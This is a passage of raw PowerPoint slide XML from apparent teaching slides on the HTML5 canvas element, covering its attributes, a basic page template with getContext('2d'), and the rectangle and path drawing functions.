          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>&lt;canvas&gt; tag</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27651" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{58009958-914A-4CCE-98F1-2B0885D7E808}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>attributes: width &amp; height, which are dimensions in pixels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>usually you also want do define </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" i="1"/>
              <a:t>id</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>this tag is not closed in Safari</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>should be closed in other browsers with &lt;/canvas&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>fallback content (insides of &lt;canvas&gt;&lt;/canvas&gt;) are displayed if canvas is not supported by particular browser, but this won't work in Safari</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>after getting canvas element (usually via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" i="1"/>
              <a:t>getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>) you need 2D drawing context:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2800">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>context = canvas.getContext('2d'); </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2800">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="280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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79F47583-72E0-44B4-AB1D-707E2D5A984E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Canvas Code Template</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137219" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6248C135-3C26-471E-8836-3A92064DE82B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1564412"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</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html</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt;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head</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meta</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charset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"utf-8"</a:t>
            </a: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title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00000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test</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title</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meta</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name</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viewport</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content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width</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device-width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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initial-scale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1"</a:t>
            </a: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var</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draw</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canvas</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canvas</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getContext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"2d"</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do</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your</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drawing</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here</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head</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onload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draw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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id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canvas</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width</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"1024"</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height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"768"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>canvas</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79B20EC0-1B41-4116-9508-A21B26DA557F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Drawing Shapes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138243" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15C3F2D5-98BB-4AF1-879D-75973F785CF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>origin (0, 0) is the upper left-hand corner of the canvas area (the rotation, scale and origin can be changed with transformations)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1" dirty="0" err="1"/>
              <a:t>fillRect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>)	Draws a filled rectangle with (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>) as its upper left-hand coordinates</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1" dirty="0" err="1"/>
              <a:t>strokeRect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>)	Draws a rectangular outline with (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>) as its upper left-hand coordinates </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1" dirty="0" err="1"/>
              <a:t>clearRect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>)	Clears the specified area and makes it fully transparent </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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18372C9F-2BAA-46F8-A734-65A10FF93A27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Defining and Drawing Paths</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139267" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{925F93AF-BDF3-4C8C-AAB9-F90EF5C2599E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4853136"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>beginPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> start a new path to draw a new shape</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>closePath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>draw a line between current point and start of path (never needed for filled shaped)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>stroke()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> draw the path</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>fill() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>fill the area limited by the path</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>moveTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>make (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) a new starting point</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>lineTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>draw a line from current location to (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>). You must call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>moveTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>() at least once before </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>lineTo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> (otherwise Firefox won't show anything)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>arc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>radius</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>startAngle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>endAngle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>anticlockwise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>draw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>circular</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>arc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>. (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>x, y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>) is center </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>point</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>  of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>circle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>startAngle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>endAngle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>are</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>radians</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0" err="1"/>
              <a:t>true</a:t>
            </a:r>
